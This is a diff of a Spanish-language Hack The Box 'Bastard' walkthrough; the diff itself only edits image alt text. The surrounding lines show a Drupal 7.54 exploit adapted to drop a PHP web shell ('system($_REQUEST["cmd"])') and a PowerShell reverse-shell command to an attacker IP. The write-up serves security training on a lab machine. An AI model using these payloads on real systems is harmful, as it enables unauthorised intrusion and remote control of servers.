@@ -104,11 +104,11 @@ http://10.10.10.9/ [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal,
 
 Tenemos un Microsft IIS 7.5 y un CMS Drupal. Ahora si vamos a echarle un ojo.
 
-![](/assets/images/htb-bastard/bastard-drupal.png)
+![""](/assets/images/htb-bastard/bastard-drupal.png)
 
 Como observamos el CMS Drupal, por lo que podríamos tratar de probar credenciales default; sin embargo, vemos que no tenemos acceso. Analizando un poco la información obtenida de `nmap`, debería existir un recurso denominado `changelog.txt` en el cual podemos ver la versión del gestor de contenido.
 
-![](/assets/images/htb-bastard/bastard-cms.png)
+![""](/assets/images/htb-bastard/bastard-cms.png)
 
 Vemos que se trata de ***Drupal 7.54***, así que utilizamos `searchsploit` para observar algún exploit público:
 
@@ -168,7 +168,7 @@ Analizando el exploit, vemos que necesitamos realizarle unos cambios para que se
 - `$url = 'http://vmweb.lan/drupal-7.54'` lo cambiamos por `$url = 'http://10.10.10.9'`.
 - `$endpoint_path = '/rest_endpoint'` si validamos el recurso, vemos que no existe; sin embargo, pensando un poco, vemos que busca el recurso `/rest_endpoint`, así que podríamos buscar por `/rest` el cual si existe.
 
-![](/assets/images/htb-bastard/bastard-rest.png)
+![""](/assets/images/htb-bastard/bastard-rest.png)
 
 - Vemos que el exploit define un nombre archivo el cual va a ser subido para inyectar nuestro código malicioso `'filename' => 'dixuSOspsOUU.php',`; aquí podriamos ponerle el nombre que nosotros queramos, como por ejemplo ***k4mishell.php***.
 - A nivel de data, se tiene esto `'data' => '<?php eval(file_get_contents(\'php://input\')); ?>'`; sin embargo, nosotros queremos utilizar una variable para poder ejecutar comandos; así que lo modificamos por `'data' => '<?php system($_REQUEST["cmd"]); ?>'`.
@@ -513,7 +513,7 @@ File written: http://10.10.10.9//k4miyo.php
 
 Si accedemos al recurso que nos indica `http://10.10.10.9//k4miyo.php` y validamos que tenemos ejecución de comandos con nuestra variable `cmd`:
 
-![](/assets/images/htb-bastard/bastard-cmd.png)
+![""](/assets/images/htb-bastard/bastard-cmd.png)
 
 Una vez teniendo ejecución de comandos, ahora si nos entablamos una reverse shell; por lo tanto, nos copiamos el archivo `Invoke-PowerShellTcp.ps1` a nuestro directorio de trabajo y al final del archivo agregamos al siguiente linea `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.17 -Port 443`
 
